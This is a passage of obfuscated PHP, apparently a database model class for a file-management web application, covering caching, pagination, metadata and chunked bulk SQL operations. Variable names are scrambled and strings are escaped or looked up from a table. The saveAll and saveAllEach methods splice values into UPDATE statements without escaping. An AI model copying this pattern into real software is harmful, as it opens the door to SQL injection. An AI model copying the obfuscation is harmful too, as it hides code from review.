preg_replace_callback($Ó®¶…®ß[436], function ($°ĞèÅ¨) { return $_SERVER[°‰†òö¯][100]; }, $Ñ™±İ´); return json_decode($Ñ™±İ´); } public function setAutoIncrement($à®†€ÄÏ) { $—÷ÂÉÎô = array($this->getPk() => $à®†€ÄÏ); $®«”ŠªØ = $this->data($—÷ÂÉÎô)->add(); if ($®«”ŠªØ) { $this->delete($®«”ŠªØ); } } public function getAutoIncrement() { $¡Íã‘Á³ = $this->getTableName(); $ÄÉ³´¶ = $this->max($this->getPk()); $ÕÅ³ÕÔ¢ = $this->query("\163\150\x6f\167\x20\164\141\x62\154\145\x20\163\x74\x61\164\x75\163\x20\x77\150\x65\x72\x65\40\116\x61\155\x65\75\x27{$¡Íã‘Á³}\x27"); $ÑŞˆ€æ— = $ÕÅ³ÕÔ¢[0][$_SERVER[°‰†òö¯][437]]; $‰äè¬®ü = max($ÄÉ³´¶, $ÑŞˆ€æ—); return $‰äè¬®ü; } protected function _callBefore($ˆµ’ƒØ , $ÂÅ“›Ÿ) { return $this->cacheCallCheck($ˆµ’ƒØ , $ÂÅ“›Ÿ, !1); } protected function _callAfter($´ó¤ûí¡, $£¤¸â¸ï) { return $this->cacheCallCheck($´ó¤ûí¡, $£¤¸â¸ï, !0); } protected function cacheFunctionAlias($Ü£ÎÈ ò) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($­¦–¾èÅ, $ïñûªº˜, $îËË¿ï = false) { $ç°â—Áœ =& $_SERVER[°‰†òö¯]; $ÜÑ®ƒ¯ = $this->cacheFunctionAlias($ïñûªº˜); if (!$ÜÑ®ƒ¯) { return; } foreach ($ÜÑ®ƒ¯ as $¢¯Çï°› => $ó¸“ş Ü) { $—ÍñÚ¤ƒ = $ó¸“ş Ü[0]; $—•ÏÜì” = explode($ç°â—Áœ[50], $ó¸“ş Ü[1]); $ıìÓù¹õ = isset($ó¸“ş Ü[2]) ? $ó¸“ş Ü[2] : $ç°â—Áœ[12]; if ($­¦–¾èÅ == $¢¯Çï°›) { return $this->cacheFunctionGet($¢¯Çï°›, $—ÍñÚ¤ƒ, $ıìÓù¹õ); } if ($îËË¿ï && in_array($­¦–¾èÅ, $—•ÏÜì”)) { $this->cacheFunctionClear($¢¯Çï°›, $—ÍñÚ¤ƒ, $ıìÓù¹õ); } } } public function cacheFunctionGet($²­¦ßÍµ, $õ§Òã§©, $ô‡æ§¦ = '') { $±ß’Ù‚¤ = $this->cacheKeyMake($²­¦ßÍµ, $õ§Òã§©, $ô‡æ§¦); $¢òêÃ«è = Cache::get($±ß’Ù‚¤); if (!is_array($¢òêÃ«è)) { $¢òêÃ«è = call_user_func_array(array($this, $²­¦ßÍµ), array($õ§Òã§©, !0)); Cache::set($±ß’Ù‚¤, $¢òêÃ«è); } return $¢òêÃ«è; } public function cacheFunctionClear($Å¨§àÜ, $˜Øüà, $ıÜÑáÜ° = '') { $ÇœÛ¶–Æ = $˜Øüà; if (!is_array($˜Øüà)) { $ÇœÛ¶–Æ = array($˜Øüà); } foreach ($ÇœÛ¶–Æ as $ÚŞÖ”ÛÁ) { $ÌÁäï ù = $this->cacheKeyMake($Å¨§àÜ, $ÚŞÖ”ÛÁ, $ıÜÑáÜ°); Cache::remove($ÌÁäï ù); } } public function cacheKeyMake($İ‘µÓ«Ü, $ò“šã¢Ã, $¥Èİæá½) { $»ÄÅ‹úŠ =& $_SERVER[°‰†òö¯]; if ($¥Èİæá½) { $ò“šã¢Ã = $ò“šã¢Ã . $»ÄÅ‹úŠ[438] . $¥Èİæá½; } return get_class($this) . $»ÄÅ‹úŠ[11] . $İ‘µÓ«Ü . $»ÄÅ‹úŠ[439] . $ò“šã¢Ã; } protected function selectPageReset() { $é–÷º¼ =& $_SERVER[°‰†òö¯]; if (isset($GLOBALS[$é–÷º¼[440]])) { return; } $GLOBALS[$é–÷º¼[440]] = isset($GLOBALS[$é–÷º¼[7]][$é–÷º¼[441]]) ? $GLOBALS[$é–÷º¼[7]][$é–÷º¼[441]] : !1; $GLOBALS[$é–÷º¼[442]] = isset($GLOBALS[$é–÷º¼[7]][$é–÷º¼[430]]) ? $GLOBALS[$é–÷º¼[7]][$é–÷º¼[430]] : !1; $GLOBALS[$é–÷º¼[7]][$é–÷º¼[441]] = !1; $GLOBALS[$é–÷º¼[7]][$é–÷º¼[430]] = !1; } protected function selectPageRestore() { $å„ÑÓŠ =& $_SERVER[°‰†òö¯]; if (!isset($GLOBALS[$å„ÑÓŠ[440]])) { return; } $GLOBALS[$å„ÑÓŠ[7]][$å„ÑÓŠ[441]] = $GLOBALS[$å„ÑÓŠ[440]]; $GLOBALS[$å„ÑÓŠ[7]][$å„ÑÓŠ[430]] = $GLOBALS[$å„ÑÓŠ[442]]; if ($GLOBALS[$å„ÑÓŠ[7]][$å„ÑÓŠ[441]] === !1) { unset($GLOBALS[$å„ÑÓŠ[7]][$å„ÑÓŠ[441]]); } if ($GLOBALS[$å„ÑÓŠ[7]][$å„ÑÓŠ[430]] === !1) { unset($GLOBALS[$å„ÑÓŠ[7]][$å„ÑÓŠ[430]]); } unset($GLOBALS[$å„ÑÓŠ[440]]); unset($GLOBALS[$å„ÑÓŠ[442]]); } protected function selectPage($ûßæÛ†ä = 200, $¥Æ²ƒ“° = 1) { $ú¯Í‹Àî =& $_SERVER[°‰†òö¯]; global $in; $ù¶óâˆû = $this->optionsValue(); $™®åÓõ = 50000; $ûßæÛ†ä = isset($in[$ú¯Í‹Àî[441]]) && $in[$ú¯Í‹Àî[441]] ? $in[$ú¯Í‹Àî[441]] : $ûßæÛ†ä; if ($ûßæÛ†ä === -1) { $in[$ú¯Í‹Àî[441]] = !1; $™®åÓõ = 100000000; $ûßæÛ†ä = $™®åÓõ; } $¢‘ˆêµú = $ù¶óâˆû; $¢‘ˆêµú[$ú¯Í‹Àî[443]] = array(); $ûßæÛ†ä = intval($ûßæÛ†ä); $ûßæÛ†ä = $ûßæÛ†ä <= 5 ? 5 : ($ûßæÛ†ä >= $™®åÓõ ? $™®åÓõ : $ûßæÛ†ä); $¥Æ²ƒ“° = intval(isset($in[$ú¯Í‹Àî[430]]) && $in[$ú¯Í‹Àî[430]] ? $in[$ú¯Í‹Àî[430]] : $¥Æ²ƒ“°); $¥Æ²ƒ“° = $¥Æ²ƒ“° <= 1 ? 1 : $¥Æ²ƒ“°; $‹¤àı‰İ = array(); $óä¤Æ—‡ = 1; if ($¥Æ²ƒ“° == 1 && $óä¤Æ—‡) { $this->optionsValue($ù¶óâˆû); $‹¤àı‰İ = $this->page($¥Æ²ƒ“°, $ûßæÛ†ä)->select(); $Ğ¯’¾Ï  = is_array($‹¤àı‰İ) ? count($‹¤àı‰İ) : 0; if ($Ğ¯’¾Ï  < $ûßæÛ†ä) { $ŞƒòôÜ = 1; } else { $this->optionsValue($¢‘ˆêµú); $Ğ¯’¾Ï  = intval($this->count()); $ŞƒòôÜ = ceil($Ğ¯’¾Ï  / $ûßæÛ†ä); } } else { $this->optionsValue($¢‘ˆêµú); $Ğ¯’¾Ï  = intval($this->count()); $ŞƒòôÜ = ceil($Ğ¯’¾Ï  / $ûßæÛ†ä); $¥Æ²ƒ“° = $¥Æ²ƒ“° >= $ŞƒòôÜ ? $ŞƒòôÜ : $¥Æ²ƒ“°; $this->optionsValue($ù¶óâˆû); $‹¤àı‰İ = $this->page($¥Æ²ƒ“°, $ûßæÛ†ä)->select(); } if (!is_array($‹¤àı‰İ)) { $‹¤àı‰İ = array(); } if ($ŞƒòôÜ == 1) { $Ğ¯’¾Ï  = count($‹¤àı‰İ); } $çÕÅƒÄ• = array($ú¯Í‹Àî[444] => array($ú¯Í‹Àî[445] => $Ğ¯’¾Ï , $ú¯Í‹Àî[441] => $ûßæÛ†ä, $ú¯Í‹Àî[430] => $¥Æ²ƒ“°, $ú¯Í‹Àî[446] => $ŞƒòôÜ), $ú¯Í‹Àî[447] => $‹¤àı‰İ); return $çÕÅƒÄ•; } protected function checkLength($×ñ¹÷’é, $ÁÒ­Ë± = 0, $ú¢è’şÊ = '') { $¿î·´âÈ =& $_SERVER[°‰†òö¯]; $ÁÒ­Ë± = $ÁÒ­Ë± ? $ÁÒ­Ë± : 65536; if (!$×ñ¹÷’é || strlen($×ñ¹÷’é) < $ÁÒ­Ë±) { return; } $ú¢è’şÊ = $ú¢è’şÊ ? $ú¢è’şÊ . $¿î·´âÈ[74] : $¿î·´âÈ[12]; show_json($ú¢è’şÊ . LNG($¿î·´âÈ[448]) . "\50{$ÁÒ­Ë±}\x29", !1); } protected function metaSet($í·—è, $å€õ  = null, $ÃøÖ‚ìš = null) { $¤ÛÆá¸ï =& $_SERVER[°‰†òö¯]; if (!$this->tableMeta || !$í·—è) { return !1; } $©ÖÜø¿á = $this->tableMeta[$¤ÛÆá¸ï[449]]; $˜©º¥ºè = $this->tableMeta[$¤ÛÆá¸ï[450]]; $¢¹Ô£‹ã = Model($˜©º¥ºè); $„Óèº¤¥ = array($©ÖÜø¿á => $í·—è, $¤ÛÆá¸ï[451] => $å€õ ); if (is_null($å€õ )) { return $¢¹Ô£‹ã->where(array($©ÖÜø¿á => $í·—è))->delete(); } if (is_null($ÃøÖ‚ìš) && is_string($å€õ )) { return $¢¹Ô£‹ã->where($„Óèº¤¥)->delete(); } $Í’ì¥÷Ò = is_array($å€õ ) ? $å€õ  : array(); if (is_string($å€õ )) { $Í’ì¥÷Ò[$å€õ ] = $ÃøÖ‚ìš; } $¥‘µÂ«î = array(); foreach ($Í’ì¥÷Ò as $Á‘À¼ÕÜ => $”„‘äÓÓ) { if (is_null($”„‘äÓÓ) && is_string($Á‘À¼ÕÜ)) { $¢¹Ô£‹ã->where(array($©ÖÜø¿á => $í·—è, $¤ÛÆá¸ï[451] => $Á‘À¼ÕÜ))->delete(); continue; } $this->checkLength($”„‘äÓÓ, !1, $˜©º¥ºè . $¤ÛÆá¸ï[4] . $Á‘À¼ÕÜ); $¥‘µÂ«î[] = array($©ÖÜø¿á => $í·—è, $¤ÛÆá¸ï[97] => $Á‘À¼ÕÜ, $¤ÛÆá¸ï[452] => $”„‘äÓÓ); } $ŠÍ÷öØ = $¤ÛÆá¸ï[453] . $˜©º¥ºè; CacheLock::lock($ŠÍ÷öØ); $¢¹Ô£‹ã->where(array($©ÖÜø¿á => $í·—è))->addAll($¥‘µÂ«î, array(), !0); CacheLock::unlock($ŠÍ÷öØ); return !0; } public function metaGet($Ÿ›æü›Ù, $ßæé–ëÄ = false) { $öÁÀîÕº =& $_SERVER[°‰†òö¯]; if (!$this->tableMeta) { return array(); } $Äğ¦¼¾Õ = $this->tableMeta[$öÁÀîÕº[449]]; $ŞÍ£ëÉ = Model($this->tableMeta[$öÁÀîÕº[450]]); if ($ßæé–ëÄ) { $©µ±ÓñÄ = array($Äğ¦¼¾Õ => $Ÿ›æü›Ù, $öÁÀîÕº[97] => $ßæé–ëÄ); return $ŞÍ£ëÉ->where($©µ±ÓñÄ)->getField($öÁÀîÕº[452]); } $©µ±ÓñÄ = array($Äğ¦¼¾Õ => $Ÿ›æü›Ù); $ŞÄê™Ùš = $ŞÍ£ëÉ->field($öÁÀîÕº[454])->where($©µ±ÓñÄ)->select(); $ŞÄê™Ùš = array_to_keyvalue($ŞÄê™Ùš, $öÁÀîÕº[97], $öÁÀîÕº[452]); return $ŞÄê™Ùš; } private function checkDataAutoHas($¶º›¥“) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $»‹ªıœû) { if (in_array($¶º›¥“, explode($_SERVER[°‰†òö¯][50], $»‹ªıœû[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¦Ğ‘º«¦, $¹„àÒ¨±) { $ó³´ØŸ =& $_SERVER[°‰†òö¯]; if (!is_array($¦Ğ‘º«¦)) { return; } foreach ($this->dataAuto as $ ã÷øÄ) { $ ¢”²ºå = $ ã÷øÄ[0]; if (!in_array($¹„àÒ¨±, explode($ó³´ØŸ[50], $ ã÷øÄ[2]))) { continue; } switch (trim($ ã÷øÄ[3])) { case $ó³´ØŸ[398]: case $ó³´ØŸ[399]: $›¶¦Ñ»„ = $ ã÷øÄ[1]; $õ³êß“ş = isset($ ã÷øÄ[4]) ? (array) $ ã÷øÄ[4] : array(); if ($›¶¦Ñ»„ == $ó³´ØŸ[206] && array_key_exists($ ¢”²ºå, $¦Ğ‘º«¦)) { if (!$¦Ğ‘º«¦[$ ¢”²ºå]) { unset($¦Ğ‘º«¦[$ ¢”²ºå]); } break; } if (isset($¦Ğ‘º«¦[$ ¢”²ºå])) { array_unshift($õ³êß“ş, $¦Ğ‘º«¦[$ ¢”²ºå]); } if ($ó³´ØŸ[398] == $ ã÷øÄ[3]) { $¦Ğ‘º«¦[$ ¢”²ºå] = call_user_func_array($›¶¦Ñ»„, $õ³êß“ş); } else { $¦Ğ‘º«¦[$ ¢”²ºå] = call_user_func_array(array(&$this, $›¶¦Ñ»„), $õ³êß“ş); } break; case $ó³´ØŸ[349]: if (isset($¦Ğ‘º«¦[$ ¢”²ºå]) && $¦Ğ‘º«¦[$ ¢”²ºå]) { $¦Ğ‘º«¦[$ ¢”²ºå] = call_user_func_array(array(&$this, $ ã÷øÄ[1]), array($¦Ğ‘º«¦[$ ¢”²ºå])); } break; case $ó³´ØŸ[352]: $¦Ğ‘º«¦[$ ¢”²ºå] = $¦Ğ‘º«¦[$ ã÷øÄ[1]]; break; case $ó³´ØŸ[371]: if (isset($¦Ğ‘º«¦[$ ¢”²ºå]) && !is_string($¦Ğ‘º«¦[$ ¢”²ºå])) { $¦Ğ‘º«¦[$ ¢”²ºå] = json_encode_force($¦Ğ‘º«¦[$ ¢”²ºå]); } break; case $ó³´ØŸ[400]: if ($¦Ğ‘º«¦[$ ¢”²ºå] === $ó³´ØŸ[12]) { unset($¦Ğ‘º«¦[$ ¢”²ºå]); } break; case $ó³´ØŸ[401]: $¦Ğ‘º«¦[$ ¢”²ºå] = $ ã÷øÄ[1]; default: break; } } if ($¹„àÒ¨± == $ó³´ØŸ[432]) { $ç•ÚÆğ“ = strtolower($this->db->getDbType()); if (strpos($ç•ÚÆğ“, $ó³´ØŸ[13]) !== 0) { return; } $’¾ˆİ«ò = $this->field(!0)->fields; $ù¶Àœş‡ = $’¾ˆİ«ò[$ó³´ØŸ[331]]; if (isset($’¾ˆİ«ò[$ó³´ØŸ[330]])) { unset($ù¶Àœş‡[$’¾ˆİ«ò[$ó³´ØŸ[330]]]); } foreach ($ù¶Àœş‡ as $³á—ÅŠß => $¹„àÒ¨±) { if (!isset($¦Ğ‘º«¦[$³á—ÅŠß])) { $¦Ğ‘º«¦[$³á—ÅŠß] = $ó³´ØŸ[12]; } } } } private function dataAfterFilter(&$Êûîæ†ï) { $ÒÙ«Ğ¢ =& $_SERVER[°‰†òö¯]; foreach ($this->dataAuto as $âıç”Â¹) { $™ÕşìÜÊ = $âıç”Â¹[0]; if (!isset($Êûîæ†ï[$™ÕşìÜÊ])) { continue; } if (!in_array($ÒÙ«Ğ¢[434], explode($ÒÙ«Ğ¢[50], $âıç”Â¹[2]))) { continue; } switch (trim($âıç”Â¹[3])) { case $ÒÙ«Ğ¢[398]: case $ÒÙ«Ğ¢[399]: $ç—í¤üí = isset($âıç”Â¹[4]) ? (array) $âıç”Â¹[4] : array(); array_unshift($ç—í¤üí, $Êûîæ†ï[$™ÕşìÜÊ]); if (isset($âıç”Â¹[4]) && $âıç”Â¹[4] == $ÒÙ«Ğ¢[455]) { $ç—í¤üí = array($Êûîæ†ï[$™ÕşìÜÊ]); } if ($ÒÙ«Ğ¢[398] == $âıç”Â¹[3]) { $Êûîæ†ï[$™ÕşìÜÊ] = call_user_func_array($âıç”Â¹[1], $ç—í¤üí); } else { $Êûîæ†ï[$™ÕşìÜÊ] = call_user_func_array(array(&$this, $âıç”Â¹[1]), $ç—í¤üí); } break; case $ÒÙ«Ğ¢[349]: if (isset($Êûîæ†ï[$™ÕşìÜÊ]) && $Êûîæ†ï[$™ÕşìÜÊ]) { $Êûîæ†ï[$™ÕşìÜÊ] = call_user_func_array(array(&$this, $âıç”Â¹[1]), array($Êûîæ†ï[$™ÕşìÜÊ])); } break; case $ÒÙ«Ğ¢[352]: $Êûîæ†ï[$™ÕşìÜÊ] = $Êûîæ†ï[$âıç”Â¹[1]]; break; case $ÒÙ«Ğ¢[371]: $—ÄÊŠ›™ = $Êûîæ†ï[$™ÕşìÜÊ]; $Êûîæ†ï[$™ÕşìÜÊ] = json_decode($—ÄÊŠ›™, !0); if (is_null($Êûîæ†ï[$™ÕşìÜÊ])) { $Êûîæ†ï[$™ÕşìÜÊ] = $—ÄÊŠ›™; } break; case $ÒÙ«Ğ¢[400]: if ($Êûîæ†ï[$™ÕşìÜÊ] === $ÒÙ«Ğ¢[12]) { unset($Êûîæ†ï[$™ÕşìÜÊ]); } break; case $ÒÙ«Ğ¢[401]: $Êûîæ†ï[$™ÕşìÜÊ] = $âıç”Â¹[1]; break; default: break; } } } public function saveAll($¼„¡Ú‡÷) { $ÍÜá”·ä =& $_SERVER[°‰†òö¯]; $À·ÛÂƒĞ = $this->tablePrefix . $this->tableName; $ö–«¡· = self::SQL_WHERE_IN_CHUNK; $¼„¡Ú‡÷ = is_array($¼„¡Ú‡÷) ? $¼„¡Ú‡÷ : array(); $œäÊ†÷ø = $ÍÜá”·ä[456]; $ÉÌˆ§Í„ = 0; $Ü ‡Û‰Ä = array(); $ÍÓ‡°Î¼ = count($¼„¡Ú‡÷); for ($°şÃáÍ¹ = 0; $°şÃáÍ¹ < $ÍÓ‡°Î¼; $°şÃáÍ¹++) { $ëîË¿¨¤ = $¼„¡Ú‡÷[$°şÃáÍ¹]; if (!is_array($ëîË¿¨¤) || count($ëîË¿¨¤) != 4) { continue; } $“ÛÕº¡ = "\125\x50\x44\x41\x54\105\40\x60{$À·ÛÂƒĞ}\140\40\123\x45\x54\x20{$ëîË¿¨¤[2]}\x20\x3d\40\x43\x41\x53\x45\x20{$ëîË¿¨¤[0]}\x20\xa"; if ($ÉÌˆ§Í„ == 0) { $œäÊ†÷ø = $“ÛÕº¡; } $Ü ‡Û‰Ä[] = $ÍÜá”·ä[121] . $ëîË¿¨¤[1] . $ÍÜá”·ä[121]; $ÉÌˆ§Í„++; $œäÊ†÷ø .= "\40\127\x48\x45\x4e\40\47{$ëîË¿¨¤[1]}\47\x20\x54\x48\x45\x4e\x20\x27{$ëîË¿¨¤[3]}\x27\40\12"; if ($ÉÌˆ§Í„ == $ö–«¡· || $°şÃáÍ¹ == $ÍÓ‡°Î¼ - 1) { $ÒÚ÷çîÔ = implode($ÍÜá”·ä[50], $Ü ‡Û‰Ä); $œäÊ†÷ø .= "\x20\105\116\104\40\40\x57\110\x45\122\x45\x20{$ëîË¿¨¤[0]}\x20\111\116\40\x28{$ÒÚ÷çîÔ}\x29\x20"; $this->execute($œäÊ†÷ø); $ÉÌˆ§Í„ = 0; $œäÊ†÷ø = $“ÛÕº¡; $this->chunkEventCheck(count($Ü ‡Û‰Ä)); $Ü ‡Û‰Ä = array(); } } $this->chunkEventSet(); } public function saveAllEach($†ãô“ª ) { $­ëõÕ¿Ô =& $_SERVER[°‰†òö¯]; $‘Ù±ºªÚ = $this->tablePrefix . $this->tableName; foreach ($†ãô“ª  as $×Üú·ëÆ) { if (!is_array($×Üú·ëÆ) || count($×Üú·ëÆ) != 4) { continue; } $É·‰á¶Ÿ = $×Üú·ëÆ[0] . $­ëõÕ¿Ô[457] . $×Üú·ëÆ[1] . $­ëõÕ¿Ô[121]; $°èÒœËÄ = $×Üú·ëÆ[2] . $­ëõÕ¿Ô[457] . $×Üú·ëÆ[3] . $­ëõÕ¿Ô[121]; $Ã¬øÈ£Ä = "\x75\160\144\x61\x74\145\x20{$‘Ù±ºªÚ}\40\x73\x65\164\40{$°èÒœËÄ}\40\167\x68\x65\x72\x65\40{$É·‰á¶Ÿ}\73"; $this->execute($Ã¬øÈ£Ä); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ò˜İ©£Ó = false, $˜ÌõæÏÏ = false) { $this->_chunkEvent = $Ò˜İ©£Ó; $this->_chunkEventParam = $˜ÌõæÏÏ; } private function chunkEventCheck($ı÷§†ÜÈ) { if (!$this->_chunkEvent) { return; } $×À€ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $×À€[$_SERVER[°‰†òö¯][458]] = $ı÷§†ÜÈ; Hook::trigger($this->_chunkEvent, $×À€); } public function addAll($ Ë—‹ô°, $Å¢È”’š = array(), $¦ÙŞ—Ÿ× = false) { $ïÖŠàä =& $_SERVER[°‰†òö¯]; ignore_timeout(); $¼ùëŠ§„ = self::SQL_WHERE_IN_CHUNK; if (empty($ Ë—‹ô°)) { $this->error = think_lang($ïÖŠàä[350]); return !1; } $Å¢È”’š = $this->_parseOptions($Å¢È”’š); foreach ($ Ë—‹ô° as $¨Ç¾ûÔ => $Éöæ³™Ü) { $ Ë—‹ô°[$¨Ç¾ûÔ] = $this->_facade($Éöæ³™Ü); $this->_beforeInsert($ Ë—‹ô°[$¨Ç¾ûÔ], $Å¢È”’š); } if (method_exists($this->db, $ïÖŠàä[351])) { for ($ªĞ«ÚÈ = 0; $ªĞ«ÚÈ < count($ Ë—‹ô°); $ªĞ«ÚÈ += $¼ùëŠ§„) { $µ¸«Ô‡ = array_slice($ Ë—‹ô°, $ªĞ«ÚÈ, $¼ùëŠ§„); if (!is_array($µ¸«Ô‡) || count($µ¸«Ô‡) == 0) { break; } $¦İàÉ  = $this->db->insertAll($µ¸«Ô‡, $Å¢È”’š, $¦ÙŞ—Ÿ×); $this->chunkEventCheck(count($µ¸«Ô‡)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ Ë—‹ô° as $¨Ç¾ûÔ => $Éöæ³™Ü) { $¦İàÉ  = $this->db->insert($Éöæ³™Ü, $Å¢È”’š, $¦ÙŞ—Ÿ×); } $this->commit(); } if (!1 !== $¦İàÉ ) { $©—„ ü = $this->getLastInsID(); if ($©—„ ü) { return $©—„ ü; } } return $¦İàÉ ; } public function save($§¸á’‡ş = '', $‚ ÒÙ³ = array()) { $ùÀ¾Ò =& $_SERVER[°‰†òö¯]; $óëÖû = self::SQL_WHERE_IN_CHUNK; $Ä·Ö = $this->optionsValue(); $†‰ÉıèË = $this->findWhereField($Ä·Ö); if (!$†‰ÉıèË) { return parent::save($§¸á’‡ş, $‚ ÒÙ³); } $ß¢İßŞ« = 0; $‡Ú˜¤«½ = $Ä·Ö[$ùÀ¾Ò[354]][$†‰ÉıèË][1]; $‡Ú˜¤«½ = is_array($‡Ú˜¤«½) ? $‡Ú˜¤«½ : array(); $Çº‡·ÌÔ = count($‡Ú˜¤«½); for ($üŸ²çØ = 0; $üŸ²çØ < $Çº‡·ÌÔ; $üŸ²çØ += $óëÖû) { $‡´ãˆä£ = array_slice($‡Ú˜¤«½, $üŸ²çØ, $óëÖû); if (!is_array($‡´ãˆä£) || count($‡´ãˆä£) == 0) { break; } $Ä·Ö[$ùÀ¾Ò[354]][$†‰ÉıèË][1] = $‡´ãˆä£; $this->optionsValue($Ä·Ö); $ß¢İßŞ« += parent::save($§¸á’‡ş, $‚ ÒÙ³); $this->chunkEventCheck(count($‡´ãˆä£)); } $this->chunkEventSet(); return $ß¢İßŞ«; } public function add($åĞº·®– = '', $ö¢ÂŞ‹ß = array(), $ßÅğ•Æ‚ = false) { if ($this->addTaskStatus && is_array($åĞº·®–)) { $this->addTaskData[] = $åĞº·®–; return; } return parent::add($åĞº·®–, $ö¢ÂŞ‹ß, $ßÅğ•Æ‚); } public function parseWhereLike($ºô‘‘™’, $ˆ‘Ì§òÅ = '', $‹×±Ê¥· = false, &$Î†ØÂğ½ = false) { $‰çç·§ =& $_SERVER[°‰†òö¯]; $íÓŸÂ° = $GLOBALS[$‰çç·§[6]][$‰çç·§[459]]; if (!$íÓŸÂ°[$‰çç·§[460]]) { return $ºô‘‘™’; } if (!is_array($ºô‘‘™’)) { return $ºô‘‘™’; } $¼ÀÒ›… = array(); $«µƒşü’ = 0; foreach ($ºô‘‘™’ as $ìÛº£¿§ => $ŠØê™™ü) { if (is_array($ŠØê™™ü) && count($ŠØê™™ü) == 2 && $ŠØê™™ü[0] == $‰çç·§[461] && is_string($ŠØê™™ü[1]) && substr($ŠØê™™ü[1], 0, 1) == $‰çç·§[462] && substr($ŠØê™™ü[1], strlen($ŠØê™™ü[1]) - 1, 1) == $‰çç·§[462]) { $Î†ØÂğ½ = !0; $Ä˜«Ú»õ = is_string($ìÛº£¿§) ? $ìÛº£¿§ : $ˆ‘Ì§òÅ; $ÁûÂ× = substr($ŠØê™™ü[1], 1, strlen($ŠØê™™ü[1]) - 2); $ÁûÂ× = $this->db->escapeString($ÁûÂ×); if (!strpos($Ä˜«Ú»õ, $‰çç·§[10])) { $Ä˜«Ú»õ = $‰çç·§[463] . $Ä˜«Ú»õ . $‰çç·§[463]; } $Å™½ˆ‚û = $‰çç·§[222] . $ÁûÂ× . $‰çç·§[222]; $ÁûÂ× = str_replace(array($‰çç·§[10], $‰çç·§[464], $‰çç·§[11]), $‰çç·§[465], $ÁûÂ×); if ($íÓŸÂ°[$‰çç·§[466]]) { $Å™½ˆ‚û = $‰çç·§[467] . $ÁûÂ× . $‰çç·§[468]; if ($íÓŸÂ°[$‰çç·§[469]]) { $Å™½ˆ‚û = $‰çç·§[468] . $ÁûÂ× . $‰çç·§[467]; } } $¼ÀÒ›…[$«µƒşü’] = $‰çç·§[470] . $Ä˜«Ú»õ . $‰çç·§[471] . $Å™½ˆ‚û . $‰çç·§[472]; $«µƒşü’++; continue; } if (is_array($ŠØê™™ü)) { $ˆ‘Ì§òÅ = is_string($ìÛº£¿§) ? $ìÛº£¿§ : $ˆ‘Ì§òÅ; $ŠØê™™ü = $this->parseWhereLike($ŠØê™™ü, $ˆ‘Ì§òÅ, !0, $Î†ØÂğ½); } if (is_numeric($ìÛº£¿§)) { $¼ÀÒ›…[$«µƒşü’] = $ŠØê™™ü; $«µƒşü’++; } else { $¼ÀÒ›…[$ìÛº£¿§] = $ŠØê™™ü; } } if ($Î†ØÂğ½ && !$‹×±Ê¥·) { } return $¼ÀÒ›…; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ğş¶îÃı = array()) { $øà°ä =& $_SERVER[°‰†òö¯]; $ƒïõ¹ÑÁ = self::SQL_WHERE_IN_CHUNK; $åÕÂà = $this->optionsValue(); $àê²·Ñ² = $this->findWhereField($åÕÂà); if (!$àê²·Ñ² || isset($åÕÂà[$øà°ä[369]]) || isset($åÕÂà[$øà°ä[430]])) { return parent::select($Ğş¶îÃı); } $ığÑûÖä = $åÕÂà[$øà°ä[354]][$àê²·Ñ²][1]; $ığÑûÖä = is_array($ığÑûÖä) ? $ığÑûÖä : array(); $ıªäàœµ = null; for ($˜ŸíÛ†¨ = 0; $˜ŸíÛ†¨ < count($ığÑûÖä); $˜ŸíÛ†¨ += $ƒïõ¹ÑÁ) { $œííú·Ü = array_slice($ığÑûÖä, $˜ŸíÛ†¨, $ƒïõ¹ÑÁ); if (!is_array($œííú·Ü) || count($œííú·Ü) == 0) { break; } $åÕÂà[$øà°ä[354]][$àê²·Ñ²][1] = $œííú·Ü; $this->optionsValue($åÕÂà); $¶‹ú†–ä = parent::select($Ğş¶îÃı); if (!$¶‹ú†–ä) { continue; } $ıªäàœµ = is_array($ıªäàœµ) ? $ıªäàœµ : array(); $ıªäàœµ = array_merge($ıªäàœµ, $¶‹ú†–ä); } return $ıªäàœµ; } public function delete($ÌÚş“Ôº = array()) { $á…Á¨æ‹ =& $_SERVER[°‰†òö¯]; $€ƒ‚ãø = self::SQL_WHERE_IN_CHUNK; $™ÜÍ¸ÙÒ = $this->optionsValue(); $öÄõŒ = $this->findWhereField($™ÜÍ¸ÙÒ); if (!$öÄõŒ) { return parent::delete($ÌÚş“Ôº); } $¿…”â§ = 0; $Ì¼ÁµÜà = $™ÜÍ¸ÙÒ[$á…Á¨æ‹[354]][$öÄõŒ][1]; $Ì¼ÁµÜà = is_array($Ì¼ÁµÜà) ? $Ì¼ÁµÜà : array(); for ($çĞğ•Ú¸ = 0; $çĞğ•Ú¸ < count($Ì¼ÁµÜà); $çĞğ•Ú¸ += $€ƒ‚ãø) { $º´íœ‰— = array_slice($Ì¼ÁµÜà, $çĞğ•Ú¸, $€ƒ‚ãø); if (!is_array($º´íœ‰—) || count($º´íœ‰—) == 0) { break; } $™ÜÍ¸ÙÒ[$á…Á¨æ‹[354]][$öÄõŒ][1] = $º´íœ‰—; $this->optionsValue($™ÜÍ¸ÙÒ); $¿…”â§ += parent::delete($ÌÚş“Ôº); } return $¿…”â§; } private function findWhereField($„‰ûªÛ©) { $Ô±ãú =& $_SERVER[°‰†òö¯]; $ùíÚ²û´ = self::SQL_WHERE_IN_CHUNK; if (!is_array($„‰ûªÛ©) || !is_array($„‰ûªÛ©[$Ô±ãú[354]])) { return !1; } foreach ($„‰ûªÛ©[$Ô±ãú[354]] as $ÁˆõÙ· => $³¿¸·–Ê) { if (is_array($³¿¸·–Ê) && isset($³¿¸·–Ê[0]) && is_string($³¿¸·–Ê[0]) && strtolower($³¿¸·–Ê[0]) == $Ô±ãú[7] && is_array($³¿¸·–Ê[1]) && count($³¿¸·–Ê[1]) > $ùíÚ²û´) { ignore_timeout(); return $ÁˆõÙ·; } } return !1; } public function setMasterDB($ËÒ¼ƒÔ¤ = true) { think_config($_SERVER[°‰†òö¯][473], 